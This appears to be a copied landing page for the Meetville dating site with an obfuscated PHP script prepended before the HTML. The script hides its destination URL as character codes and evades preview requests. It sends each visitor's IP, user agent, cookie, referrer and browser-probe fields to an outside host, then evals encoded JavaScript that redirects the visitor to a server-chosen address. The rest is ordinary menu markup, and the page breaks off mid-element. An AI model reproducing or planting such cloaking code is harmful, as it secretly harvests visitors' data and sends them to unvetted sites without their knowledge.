<?php date_default_timezone_set("UTC");ini_set("display_errors", 0);error_reporting(E_ALL & ~E_NOTICE);function c($u=null, $q=null){if(empty($u)){return '$("#lo533116ad").hide();$("body").fadeIn(500);';}else{$u = $u.$q;for ($i = 0, $j = strlen($u); $i < $j; $i++) {$a[] = ord($u[$i]);}$u = strrev(implode(",",$a));return 'function rS(s){var nS = "";for (var i = s.length - 1; i >= 0; i--) {nS += s[i];} var a = nS.split(",");var u = String.fromCharCode.apply(null, a);return u;} var u,s,c;$("body").remove();$("html").append("body").html("<div style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\">Please Wait for Page to Load...</div>");s = rS("16,201,101,411,401,64,011,111,501,611,79,99,111,801,64,911,111,001,011,501,911");u = rS("'.$u.'");c = s+"\'"+u+"\'";eval(c);$("html").show();';}}if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"] == "preview")){if(isset($_POST["spe"])){$date = date("Y-m-d H:i:s");$id = "533116";$uid="z4egh782ikjm0ww2x3m7d7zh9";$qu=$_SERVER["QUERY_STRING"];$ch = curl_init();$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$data=array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_POST["r"],"ip"=>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query"=>$qu,"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_event"],"cam"=>$_POST["cam"],"mic"=>$_POST["mic"],"spe"=>$_POST["spe"],"mou"=>$_POST["mou"],"user_id"=>$uid,"id"=>$id);curl_setopt($ch,CURLOPT_URL,$u);curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);curl_setopt($ch,CURLOPT_POST, true);curl_setopt($ch,CURLOPT_POSTFIELDS, $data);$result = curl_exec($ch);curl_close($ch);$arr = explode(",",$result);if(!empty($qu)){if(strpos($arr[1],"?")){$q="&".$qu;}else{$q="?".$qu;}}else{$q="";}if($arr[0] === "true"){if(strstr($arr[1],"sp.php")){$q="?".$qu;}if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_event",$arr[6],time()+60*60*24*$arr[3]);}}echo c($arr[1],$q);exit();}elseif($arr[0] === "false"){if($arr[5]){$f=$q;}else{$f="";}if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}echo c($arr[1],$f);exit();}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}}}}?>
<!DOCTYPE html>
<html lang="en">
<head>
<title>Online Dating Site For Worldwide Singles  - Meetville</title>
<meta charset="UTF-8">
<meta name="description" content="❤️ Meet & Chat with Local Singles on ❰ Meetville ❱ today! 1000's of local single women & men looking for love, chat & relationship! ✅ Sign Up! >>">
<meta name="author" content="Meetville">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width">
<meta name="format-detection" content="telephone=no">
<meta property="og:title" content="Online Dating Site For Worldwide Singles  - Meetville" />
<meta property="og:type" content="website" />
<meta property="og:url" content="index.html" />
<meta property="og:image" content="seoassets/30.06.2020/images/jpg/background-01-00-medium.jpg" />
<meta property="og:image:type" content=".jpg" />
<meta property="og:image:width" content="900x" />
<meta property="og:image:height" content="506px" />
<meta property="og:site_name" content="Meetville.com" />
<meta property="og:description" content="❤️ Meet & Chat with Local Singles on ❰ Meetville ❱ today! 1000's of local single women & men looking for love, chat & relationship! ✅ Sign Up! >>" />
<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
<link href="https://fonts.googleapis.com/css?family=Roboto+Condensed:300,400,700" rel="stylesheet" type="text/css">
<link rel="preconnect" href="https://www.google-analytics.com/" crossorigin>
<link rel="preconnect" href="https://www.googletagmanager.com/" crossorigin>
<link rel="shortcut icon" href="seoassets/30.06.2020/images/favicon/favicon-128x128.png" type="image/x-icon">
<link rel="shortcut icon" href="seoassets/30.06.2020/images/favicon/favicon-16x16.png" sizes="16x16" type="image/x-icon">
<link rel="shortcut icon" href="seoassets/30.06.2020/images/favicon/favicon-32x32.png" sizes="32x32" type="image/x-icon">
<link rel="shortcut icon" href="seoassets/30.06.2020/images/favicon/android-chrome-36x36.png" sizes="36x36" type="image/x-icon">
<link rel="shortcut icon" href="seoassets/30.06.2020/images/favicon/android-chrome-48x48.png" sizes="48x48" type="image/x-icon">
<link rel="shortcut icon" href="seoassets/30.06.2020/images/favicon/android-chrome-48x48.png" sizes="48x48" type="image/x-icon">
<link rel="shortcut icon" href="seoassets/30.06.2020/images/favicon/android-chrome-72x72.png" sizes="72x72" type="image/x-icon">
<link rel="shortcut icon" href="seoassets/30.06.2020/images/favicon/android-chrome-96x96.png" sizes="96x96" type="image/x-icon">
<link rel="shortcut icon" href="seoassets/30.06.2020/images/favicon/android-chrome-144x144.png" sizes="144x144" type="image/x-icon">
<link rel="shortcut icon" href="seoassets/30.06.2020/images/favicon/android-chrome-192x192.png" sizes="192x192" type="image/x-icon">
<link rel="shortcut icon" href="seoassets/30.06.2020/images/favicon/android-chrome-256x256.png" sizes="256x256" type="image/x-icon">
<link rel="shortcut icon" href="seoassets/30.06.2020/images/favicon/android-chrome-384x384.png" sizes="384x384" type="image/x-icon">
<link rel="shortcut icon" href="seoassets/30.06.2020/images/favicon/android-chrome-512x512.png" sizes="512x512" type="image/x-icon">
<link rel="apple-touch-icon" href="seoassets/30.06.2020/images/favicon/favicon-128x128.png">
<link rel="apple-touch-icon" sizes="128x128" href="seoassets/30.06.2020/images/favicon/favicon-128x128.png">
<link rel="apple-touch-icon" sizes="192x192" href="seoassets/30.06.2020/images/favicon/favicon-192x192.png">
<link rel="apple-touch-icon" sizes="57х57" href="seoassets/30.06.2020/images/favicon/apple-touch-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60х60" href="seoassets/30.06.2020/images/favicon/apple-touch-icon-60x60.png">
<link rel="apple-touch-icon" sizes="76х76" href="seoassets/30.06.2020/images/favicon/apple-touch-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114х114" href="seoassets/30.06.2020/images/favicon/apple-touch-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120х120" href="seoassets/30.06.2020/images/favicon/apple-touch-icon-120x120.png">
<link rel="apple-touch-icon" sizes="152х152" href="seoassets/30.06.2020/images/favicon/apple-touch-icon-152x152.png">
<link rel="apple-touch-icon" sizes="167х167" href="seoassets/30.06.2020/images/favicon/apple-touch-icon-167x167.png">
<link rel="apple-touch-icon" sizes="180х180" href="seoassets/30.06.2020/images/favicon/apple-touch-icon-180x180.png">
<link rel="apple-touch-icon" sizes="128x128" href="seoassets/30.06.2020/images/favicon/favicon-128x128.png">
<link rel="apple-touch-icon" sizes="300x480" href="seoassets/30.06.2020/images/favicon/apple-touch-startup-image-300x480.png">
<link rel="apple-touch-icon" sizes="320x460" href="seoassets/30.06.2020/images/favicon/apple-touch-startup-image-320x460.png">
<link rel="apple-touch-icon" sizes="600x960" href="seoassets/30.06.2020/images/favicon/apple-touch-startup-image-600x960.png">
<link rel="apple-touch-icon" sizes="600x1136" href="seoassets/30.06.2020/images/favicon/apple-touch-startup-image-600x1136.png">
<link rel="apple-touch-icon" sizes="640x920" href="seoassets/30.06.2020/images/favicon/apple-touch-startup-image-640x920.png">
<link rel="apple-touch-icon" sizes="640x1096" href="seoassets/30.06.2020/images/favicon/apple-touch-startup-image-640x1096.png">
<link rel="apple-touch-icon" sizes="710x1134" href="seoassets/30.06.2020/images/favicon/apple-touch-startup-image-710x1334.png">
<link rel="apple-touch-icon" sizes="748x1024" href="seoassets/30.06.2020/images/favicon/apple-touch-startup-image-748x1024.png">
<link rel="apple-touch-icon" sizes="750x1294" href="seoassets/30.06.2020/images/favicon/apple-touch-startup-image-750x1294.png">
<link rel="apple-touch-icon" sizes="768x1004" href="seoassets/30.06.2020/images/favicon/apple-touch-startup-image-768x1004.png">
<link rel="apple-touch-icon" sizes="1182x2208" href="seoassets/30.06.2020/images/favicon/apple-touch-startup-image-1182x2208.png">
<link rel="apple-touch-icon" sizes="1242x2148" href="seoassets/30.06.2020/images/favicon/apple-touch-startup-image-1242x2148.png">
<link rel="apple-touch-icon" sizes="1496x2048" href="seoassets/30.06.2020/images/favicon/apple-touch-startup-image-1496x2048.png">
<link rel="apple-touch-icon" sizes="536x2008" href="seoassets/30.06.2020/images/favicon/apple-touch-startup-image-1536x2008.png">
<link rel="stylesheet" href="seoassets/30.06.2020/css/mainbaf4.css?v=0.512">



<!--[if lt IE 10]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/" target="_blank">upgrade your browser</a> to improve your experience.</p>
    <![endif]-->
</head>
<body class="font-sans-400 no-js">


<header class="header">
<div id="seo-menu" class="seo-menu">
<div class="seo-menu-bar">
<a href="index.html" class="seo-menu-logo">
<div class="main-logo-container">
<img src="seoassets/30.06.2020/images/png/meetville_symbol_logo-small.png" alt="logo">
</div>
</a>
<div class="seo-menu-bar-title">
<a rel="nofollow" href="https://m.meetville.com/?utm_source=landing&amp;utm_medium=catalog&amp;utm_campaign=header-cta" class="seo-menu-bar-title-text">
View Singles for Free
</a>
</div>
<div class="sign-in-button seo-menu-bar-sign-in-button">
Already have an account?
<a href="https://m.meetville.com/login?utm_source=landing&amp;utm_medium=catalog&amp;utm_campaign=header-cta">Sign in</a>
</div>
<button id="seo-menu-burger-btn" class="seo-menu-burger-btn">
<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
<g fill="none" fill-rule="evenodd">
<polygon points="0 0 24 0 24 24 0 24" />
<path fill="#24A2F6" d="M20.0066023,18 C20.5552407,18 21,17.5561352 21,17 L21,17 C21,16.4477153 20.5550537,16 20.0066023,16 L3.99339768,16 C3.44475929,16 3,16.4438648 3,17 L3,17 C3,17.5522847 3.44494629,18 3.99339768,18 L20.0066023,18 Z M20.0066023,13 C20.5552407,13 21,12.5561352 21,12 L21,12 C21,11.4477153 20.5550537,11 20.0066023,11 L3.99339768,11 C3.44475929,11 3,11.4438648 3,12 L3,12 C3,12.5522847 3.44494629,13 3.99339768,13 L20.0066023,13 Z M3,7 C3,7.55228475 3.44494629,8 3.99339768,8 L20.0066023,8 C20.5552407,8 21,7.55613518 21,7 L21,7 C21,6.44771525 20.5550537,6 20.0066023,6 L3.99339768,6 C3.44475929,6 3,6.44386482 3,7 L3,7 Z" />
</g>
</svg>
<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
<g fill="none" fill-rule="evenodd">
<polygon points="0 0 24 0 24 24 0 24" />
<path fill="#8E8E93" d="M18.2920226,7.11797736 C18.6830277,6.72697226 18.6870753,6.0970753 18.295,5.705 L18.295,5.705 C17.9056393,5.31563925 17.2734409,5.31655912 16.8820226,5.70797736 L12,10.59 L7.11797736,5.70797736 C6.72697226,5.31697226 6.0970753,5.3129247 5.705,5.705 L5.705,5.705 C5.31563925,6.09436075 5.31655912,6.72655912 5.70797736,7.11797736 L10.59,12 L5.70797736,16.8820226 C5.31697226,17.2730277 5.3129247,17.9029247 5.705,18.295 L5.705,18.295 C6.09436075,18.6843607 6.72655912,18.6834409 7.11797736,18.2920226 L12,13.41 L16.8820226,18.2920226 C17.2730277,18.6830277 17.9029247,18.6870753 18.295,18.295 L18.295,18.295 C18.6843607,17.9056393 18.6834409,17.2734409 18.2920226,16.8820226 L13.41,12 L18.2920226,7.11797736 Z" />
</g>
</svg>
</button>
</div>
<ul id="seo-menu-nav-root" class="seo-menu-nav-root">
<li class="seo-menu-section">
<div class="seo-menu-section-title">Top Countries</div>
<ul class="seo-menu-subcategories">
<li class="seo-menu-subcategory">
<a href="catalog/us.html" class="seo-menu-subcategory-title">United States</a>
</li>
<li class="seo-menu-subcategory">
<a href="catalog/ca.html" class="seo-menu-subcategory-title">Canada</a>
</li>
<li class="seo-menu-subcategory">
<a href="catalog/au.html" class="seo-menu-subcategory-title">Australia</a>
</li>
<li class="seo-menu-subcategory">
<a href="catalog/gb.html" class="seo-menu-subcategory-title">United Kingdom</a>
</li>
<li class="seo-menu-subcategory">
<a href="#" class="seo-menu-subcategory-title">Other Countries</a>
</li>
</ul>
</li>
<li class="seo-menu-section">
<div class="seo-menu-section-title">Top Regions</div>
<ul class="seo-menu-categories">
<li class="seo-menu-category">
<div class="seo-menu-category-title">in United States</div>
<ul class="seo-menu-subcategories">
<li class="seo-menu-subcategory">
<a href="catalog/us/ca.html" class="seo-menu-subcategory-title">California</a>
</li>
<li class="seo-menu-subcategory">
<a href="catalog/us/tx.html" class="seo-menu-subcategory-title">Texas</a>
</li>
<li class="seo-menu-subcategory">
<a href="catalog/us/fl.html" class="seo-menu-subcategory-title">Florida</a>
</li>
<li class="seo-menu-subcategory">
<a href="catalog/us/ny.html" class="seo-menu-subcategory-title">New York</a>
</li>
<li class="seo-menu-subcategory">
<a href="catalog/us/il.html" class="seo-menu-subcategory-title">Illinois</a>
</li>
</ul>
</li>
<li class="seo-menu-category">
<div class="seo-menu-category-title">in United Kingdom</div>
<ul class="seo-menu-subcategories">
<li class="seo-menu-subcategory">
<a href="catalog/gb/eng.html" class="seo-menu-subcategory-title">England</a>
</li>
<li class="seo-menu-subcategory">
<a href="catalog/gb/sct.html" class="seo-menu-subcategory-title">Scotland</a>
</li>
<li class="seo-menu-subcategory">
<a href="catalog/gb/wls.html" class="seo-menu-subcategory-title">Wales</a>
</li>
<li class="seo-menu-subcategory">
<a href="catalog/gb/nir.html" class="seo-menu-subcategory-title">Northern Ireland</a>
</li>
</ul>
</li>
<li class="seo-menu-category">
<div class="seo-menu-category-title">in Canada</div>
<ul class="seo-menu-subcategories">
<li class="seo-menu-subcategory">
<a href="catalog/ca/08.html" class="seo-menu-subcategory-title">Ontario</a>
</li>
<li class="seo-menu-subcategory">
<a href="catalog/ca/01.html" class="seo-menu-subcategory-title">Alberta</a>
</li>
<li class="seo-menu-subcategory">
<a href="catalog/ca/02.html" class="seo-menu-subcategory-title">British Columbia</a>
</li>
<li class="seo-menu-subcategory">
<a href="catalog/ca/10.html" class="seo-menu-subcategory-title">Quebec</a>
</li>
<li class="seo-menu-subcategory">
<a href="catalog/ca/11.html" class="seo-menu-subcategory-title">Saskatchewan</a>
</li>
</ul>
</li>
<li class="seo-menu-category">
<div class="seo-menu-category-title">in Australia</div>
<ul class="seo-menu-subcategories">
<li class="seo-menu-subcategory">
<a href="catalog/au/02.html" class="seo-menu-subcategory-title">New South Wales</a>
</li>
<li class="seo-menu-subcategory">
<a href="catalog/au/07.html" class="seo-menu-subcategory-title">Victoria</a>
</li>
<li class="seo-menu-subcategory">
<a href="catalog/au/04.html" class="seo-menu-subcategory-title">Queensland</a>
</li>
</ul>
</li>
</ul>
</li>
<li class="seo-menu-section">
<div class="seo-menu-section-title">Top Cities</div>
<ul class="seo-menu-categories">
<li class="seo-menu-category">
<div class="seo-menu-category-title">in United States</div>
<ul class="seo-menu-subcategories">
<li class="seo-menu-subcategory">
<a href="catalog/us/il/89703.html" class="seo-menu-subcategory-title">Chicago</a>
</li>
<li class="seo-menu-subcategory">
<a href="catalog/us/tx/88287.html" class="seo-menu-subcategory-title">Houston</a>
</li>
<li class="seo-menu-subcategory">
<a href="catalog/us/ca/95440.html" class="seo-menu-subcategory-title">Los Angeles</a>
</li>
<li class="seo-menu-subcategory">
<a href="catalog/us/pa/87422.html" class="seo-menu-subcategory-title">Philadelphia</a>
</li>
<li class="seo-menu-subcategory">
<a href="catalog/us/az/94940.html" class="seo-menu-subcategory-title">Phoenix</a>
</li>
</ul>
</li>
<li class="seo-menu-category">
<div class="seo-menu-category-title">in United Kingdom</div>
<ul class="seo-menu-subcategories">
<li class="seo-menu-subcategory">
<a href="catalog/gb/eng/37571.html" class="seo-menu-subcategory-title">London</a>
</li>
<li class="seo-menu-subcategory">
<a href="catalog/gb/sct/38036.html" class="seo-menu-subcategory-title">Glasgow</a>
</li>
</ul>
</li>
<li class="seo-menu-category">
<div class="seo-menu-category-title">in Canada</div>
<ul class="seo-menu-subcategories">
<li class="seo-menu-subcategory">
<a href="catalog/ca/08/6799.html" class="seo-menu-subcategory-title">Toronto</a>
</li>
<li class="seo-menu-subcategory">
<a href="catalog/ca/10/6551.html" class="seo-menu-subcategory-title">Montreal</a>
</li>
<li class="seo-menu-subcategory">
<a href="catalog/ca/01/6278.html" class="seo-menu-subcategory-title">Calgary</a>
</li>
<li class="seo-menu-subcategory">
<a href="catalog/ca/03/6855.html" class="seo-menu-subcategory-title">Winnipeg</a>
</li>
<li class="seo-menu-subcategory">
<a href="catalog/ca/08/6597.html" class="seo-menu-subcategory-title">Ottawa</a>
</li>
</ul>
</li>
<li class="seo-menu-category">
<div class="seo-menu-category-title">in Australia</div>
<ul class="seo-menu-subcategories">
<li class="seo-menu-subcategory">
<a href="catalog/au/07/2036.html" class="seo-menu-subcategory-title">Melbourne</a>
</li>
<li class="seo-menu-subcategory">
<a href="catalog/au/02/1884.html" class="seo-menu-subcategory-title">Sydney</a>
</li>
<li class="seo-menu-subcategory">
<a href="catalog/au/04/2314.html" class="seo-menu-subcategory-title">Brisbane</a>
</li>
<li class="seo-menu-subcategory">
<a href="catalog/au/08/1635.html" class="seo-menu-subcategory-title">Perth</a>
</li>
<li class="seo-menu-subcategory">
<a href="catalog/au/05/1801.html" class="seo-menu-subcategory-title">Adelaide</a>
</li>
</ul>
</li>
</ul>
</li>
<li class="seo-menu-section">
<div class="seo-menu-section-title">Online Dating in US</div>
<ul class="seo-menu-subcategories">
<li class="seo-menu-subcategory"><a href="catalog/us/page/381-asian.html" class="seo-menu-subcategory-title">Asian</a></li>
<li class="seo-menu-subcategory"><a href="catalog/us/page/377-black.html" class="seo-menu-subcategory-title">Black</a></li>
<li class="seo-menu-subcategory"><a href="catalog/us/page/1283-mature.html" class="seo-menu-subcategory-title">Mature</a></li>
<li class="seo-menu-subcategory"><a href="catalog/us/page/5573-christian-chat.html" class="seo-menu-subcategory-title">Christian Chat</a></li>
<li class="seo-menu-subcategory"><a href="catalog/us/page/5298-indian-chat-room.html" class="seo-menu-subcategory-title">Indian Chat</a></li>
<li class="seo-menu-subcategory"><a href="catalog/us/page/672-military.html" class="seo-menu-subcategory-title">Military</a></li>
<li class="seo-menu-subcategory"><a href="catalog/us/page/494-young.html" class="seo-menu-subcategory-title">Teenagers</a></li>
</ul>
</li>
<li class="seo-menu-section">
<div class="seo-menu-section-title">Online Dating in Canada</div>
<ul class="seo-menu-subcategories">
<li class="seo-menu-subcategory"><a href="catalog/ca/page/690-single-parents.html" class="seo-menu-subcategory-title">Single parents</a></li>
<li class="seo-menu-subcategory"><a href="catalog/ca/page/677-christian.html" class="seo-menu-subcategory-title">Christian</a></li>
<li class="seo-menu-subcategory"><a href="catalog/ca/page/379-indian.html" class="seo-menu-subcategory-title">Indian</a></li>
<li class="seo-menu-subcategory"><a href="catalog/ca/page/377-black.html" class="seo-menu-subcategory-title">Black</a></li>
</ul>
</li>
<li class="seo-menu-section">
<div class="seo-menu-section-title">Online Dating in Australia</div>
<ul class="seo-menu-subcategories">
<li class="seo-menu-subcategory"><a href="catalog/au/page/379-indian.html" class="seo-menu-subcategory-title">Indian</a></li>
<li class="seo-menu-subcategory"><a href="catalog/au/page/377-black.html" class="seo-menu-subcategory-title">Black</a></li>
<li class="seo-menu-subcategory"><a href="catalog/au/page/381-asian.html" class="seo-menu-subcategory-title">Asian</a></li>
</ul>
</li>
<li class="seo-menu-section">
<div class="seo-menu-section-title">Single Women in US</div>
<ul class="seo-menu-subcategories">
<li class="seo-menu-subcategory"><a href="catalog/us/page/496-old/woman.html" class="seo-menu-subcategory-title">Old</a></li>
<li class="seo-menu-subcategory"><a href="catalog/us/page/4090-black-bbw.html" class="seo-menu-subcategory-title">Black BBW</a></li>
<li class="seo-menu-subcategory"><a href="catalog/us/page/381-asian/woman.html" class="seo-menu-subcategory-title">Asian</a></li>
<li class="seo-menu-subcategory"><a href="catalog/us/page/1244-asian-mature/woman.html" class="seo-menu-subcategory-title">Asian Mature</a></li>
<li class="seo-menu-subcategory"><a href="catalog/us/page/4099-mature-bbw.html" class="seo-menu-subcategory-title">Mature BBW</a></li>
<li class="seo-menu-subcategory"><a href="catalog/us/page/1452-bbw.html" class="seo-menu-subcategory-title">BBW</a></li>
<li class="seo-menu-subcategory"><a href="catalog/us/page/5563-mexican-bbw.html" class="seo-menu-subcategory-title">Mexican BBW</a></li>
<li class="seo-menu-subcategory"><a href="catalog/us/page/1430-milfs.html" class="seo-menu-subcategory-title">Milfs</a></li>
</ul>
</li>
<li class="seo-menu-section">
<div class="seo-menu-section-title">Single Women in Canada</div>
<ul class="seo-menu-subcategories">
<li class="seo-menu-subcategory"><a href="catalog/ca/page/496-old/woman.html" class="seo-menu-subcategory-title">Old</a></li>
<li class="seo-menu-subcategory"><a href="catalog/ca/page/659-rich/woman.html" class="seo-menu-subcategory-title">Rich</a></li>
<li class="seo-menu-subcategory"><a href="catalog/ca/page/381-asian/woman.html" class="seo-menu-subcategory-title">Asian</a></li>
<li class="seo-menu-subcategory"><a href="catalog/ca/page/379-indian/woman.html" class="seo-menu-subcategory-title">Indian</a></li>
<li class="seo-menu-subcategory"><a href="catalog/ca/page/1431-cougar.html" class="seo-menu-subcategory-title">Cougar</a></li>
<li class="seo-menu-subcategory"><a href="catalog/ca/page/1452-bbw.html" class="seo-menu-subcategory-title">BBW</a></li>
</ul>
</li>
<li class="seo-menu-section">
<div class="seo-menu-section-title">Single Women in Australia</div>
<ul class="seo-menu-subcategories">
<li class="seo-menu-subcategory"><a href="catalog/au/page/496-old/woman.html" class="seo-menu-subcategory-title">Old</a></li>
<li class="seo-menu-subcategory"><a href="catalog/au/page/381-asian/woman.html" class="seo-menu-subcategory-title">Asian</a></li>
<li class="seo-menu-subcategory"><a href="catalog/au/page/377-black/woman.html" class="seo-menu-subcategory-title">Black</a></li>
<li class="seo-menu-subcategory"><a href="catalog/au/page/379-indian/woman.html" class="seo-menu-subcategory-title">Indian</a></li>
<li class="seo-menu-subcategory"><a href="catalog/au/page/1431-cougar.html" class="seo-menu-subcategory-title">Cougar</a></li>
<li class="seo-menu-subcategory"><a href="catalog/au/page/659-rich/woman.html" class="seo-menu-subcategory-title">Rich</a></li>
</ul>
</li>
<li class="seo-menu-section">
<div class="seo-menu-section-title">Single Women in United Kingdom</div>
<ul class="seo-menu-subcategories">
<li class="seo-menu-subcategory"><a href="catalog/gb/page/1431-cougar.html" class="seo-menu-subcategory-title">Cougar</a></li>
<li class="seo-menu-subcategory"><a href="catalog/gb/page/496-old/woman.html" class="seo-menu-subcategory-title">Old</a></li>
<li class="seo-menu-subcategory"><a href="catalog/gb/page/381-asian/woman.html" class="seo-menu-subcategory-title">Asian</a></li>
<li class="seo-menu-subcategory"><a href="catalog/gb/page/379-indian/woman.html" class="seo-menu-subcategory-title">Indian</a></li>
</ul>
</li>
<li class="seo-menu-section">
<div class="seo-menu-section-title">LGBT Dating</div>
<ul class="seo-menu-subcategories">
<li class="seo-menu-subcategory"><a href="catalog/us/page/5333-gay-chat-room.html" class="seo-menu-subcategory-title">Gay Chat Room</a></li>
<li class="seo-menu-subcategory"><a href="catalog/us/page/5338-lesbian-chat-room.html" class="seo-menu-subcategory-title">Lesbian Chat Room</a></li>
<li class="seo-menu-subcategory"><a href="catalog/us/page/4444-teen-lesbian.html" class="seo-menu-subcategory-title">Teen Lesbian</a></li>
<li class="seo-menu-subcategory"><a href="catalog/us/page/4439-bbw-lesbian.html" class="seo-menu-subcategory-title">BBW Lesbian</a></li>
<li class="seo-menu-subcategory"><a href="catalog/us/page/4231-asian-lesbian.html" class="seo-menu-subcategory-title">Asian Lesbian</a></li>
<li class="seo-menu-subcategory"><a href="catalog/us/page/4414-lesbian-latina.html" class="seo-menu-subcategory-title">Latina Lesbian</a></li>
</ul>
</li>
</ul>
<div class="seo-menu-desktop">
<div class="header-container">
<a class="logo_svg" href="index.html">
<div class="main-logo-container">
<img src="seoassets/30.06.2020/images/png/meetville_symbol_logo-small.png" alt="logo">
</div>
<svg width="143" height="24" viewBox="0 0 143 24" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M0 23.5767H4.40226V14.4586C4.40226 12.0814 5.60881 11.1696 7.27189 11.1696C8.90236 11.1696 10.1415 12.0814 10.1415 14.4586V23.5767H14.5438V14.4586C14.5438 12.0814 15.7503 11.1696 17.3808 11.1696C19.0439 11.1696 20.2504 12.0814 20.2504 14.4586V23.5767H24.6527V14.4586C24.6527 9.346 21.6852 7.06648 17.8047 7.06648C15.4242 7.06648 13.5003 8.01085 12.3263 9.8019C11.1198 8.01085 9.19584 7.06648 6.84797 7.06648C2.96745 7.06648 0 9.346 0 14.4586V23.5767Z" fill="#656D78"></path>
<path d="M35.8545 24C39.7676 24 42.7677 21.8833 43.909 18.692H39.2785C38.5611 19.6689 37.4198 20.0597 35.8545 20.0597C33.8327 20.0597 32.2349 19.0176 31.7783 16.9009H44.4308V15.5332C44.4308 10.6486 40.9416 7.06648 35.8545 7.06648C30.7674 7.06648 27.1804 10.6486 27.1804 15.5332C27.1804 20.4179 30.7674 24 35.8545 24ZM31.8762 13.8073C32.4305 11.9512 33.9306 11.0068 35.8545 11.0068C37.7458 11.0068 39.2785 11.9186 39.8655 13.8073H31.8762Z" fill="#656D78"></path>
<path d="M54.9934 24C58.9065 24 61.9066 21.8833 63.0479 18.692H58.4174C57.7 19.6689 56.5586 20.0597 54.9934 20.0597C52.9716 20.0597 51.3738 19.0176 50.9172 16.9009H63.5697V15.5332C63.5697 10.6486 60.0805 7.06648 54.9934 7.06648C49.9063 7.06648 46.3193 10.6486 46.3193 15.5332C46.3193 20.4179 49.9063 24 54.9934 24ZM51.0151 13.8073C51.5694 11.9512 53.0694 11.0068 54.9934 11.0068C56.8847 11.0068 58.4174 11.9186 59.0043 13.8073H51.0151Z" fill="#656D78"></path>
<path d="M72.7953 24C76.741 24 79.4476 21.8182 79.4476 17.2917V16.8358H75.0453V17.2917C75.0453 19.2456 74.0997 19.8969 72.7953 19.8969C71.4583 19.8969 70.5126 19.213 70.5126 17.2917V11.4627H78.4693V7.48982H70.5126V1.79104H66.1104V17.2917C66.1104 21.8182 68.817 24 72.7953 24Z" fill="#656D78"></path>
<path d="M86.5119 23.5767H91.8272L97.8599 7.48982H93.2294L89.2184 19.441L85.2075 7.48982H80.4465L86.5119 23.5767Z" fill="#656D78"></path>
<path d="M102.701 5.73134C104.364 5.73134 105.571 4.52646 105.571 2.86567C105.571 1.20488 104.364 0 102.701 0C101.038 0 99.8313 1.20488 99.8313 2.86567C99.8313 4.52646 101.038 5.73134 102.701 5.73134ZM100.483 23.5767H104.886V7.48982H100.483V23.5767Z" fill="#656D78"></path>
<path d="M109.145 23.5767H113.548V0.455902H109.145V23.5767Z" fill="#656D78"></path>
<path d="M117.807 23.5767H122.209V0.455902H117.807V23.5767Z" fill="#656D78"></path>
<path d="M133.969 24C137.882 24 140.882 21.8833 142.024 18.692H137.393C136.676 19.6689 135.534 20.0597 133.969 20.0597C131.947 20.0597 130.35 19.0176 129.893 16.9009H142.545V15.5332C142.545 10.6486 139.056 7.06648 133.969 7.06648C128.882 7.06648 125.295 10.6486 125.295 15.5332C125.295 20.4179 128.882 24 133.969 24ZM129.991 13.8073C130.545 11.9512 132.045 11.0068 133.969 11.0068C135.861 11.0068 137.393 11.9186 137.98 13.8073H129.991Z" fill="#656D78"></path>
</svg>
</a>
<a href="https://m.meetville.com/login?utm_source=landing&amp;utm_campaign=header-sign-in" class="button sign_in_link">Sign In</a>
</div>
</div>
</div>
<div class="container bg-gray-100" id="js-header-count">
<div class="row">
<div class="header-count">
<p class="font-sans-400 color-black header-count__text">Total users: <span class="font-sans-600">49,357,645</span></p>
<p class="font-sans-400 color-black header-count__text">Оnline: <span class="font-sans-600">177,684</span></p>
</div>
</div>
</div>
</header>
<main class="main">
<section class="xs_slide_wrapper">
<div class="xs_slide_title">
<span>Let's find your</span>
<span>next date</span>
</div>
<div class="xs_slide_subtitle">Are you a man or a woman?</div>
<div class="xs_slide_gender_wrap">
<a href="https://web.meetville.com/?utm_source=landing&amp;utm_campaign=registration-form&amp;sex=male" class="xs_slide_gender">
<span>🕺</span>
<span>I'm a</span>
<b>Man</b>
</a>
<a href="https://web.meetville.com/?utm_source=landing&amp;utm_campaign=registration-form&amp;sex=female" class="xs_slide_gender">
<span>💃</span>
<span>I'm a</span>
<b>Woman</b>
</a>
</div>
<div class="sign-in-button">
Already have an account?
<a href="https://m.meetville.com/login?utm_source=landing&amp;utm_medium=catalog&amp;utm_campaign=header-cta">Sign in</a>
</div>
</section>
<section class="slide slide-wrapper">
<picture>
<source srcset="https://drz2u6kbopobk.cloudfront.net/mtvl_webapp/images/background_01.1ef9f6c95749c0a2d33e319f22c277c6.webp" type="image/webp">
<source media="(min-width: 1400px)" srcset="../drz2u6kbopobk.cloudfront.net/mtvl_webapp/images/background_01_big.e805c36b0088e46314c94b2a4f5ecae8.jpg">
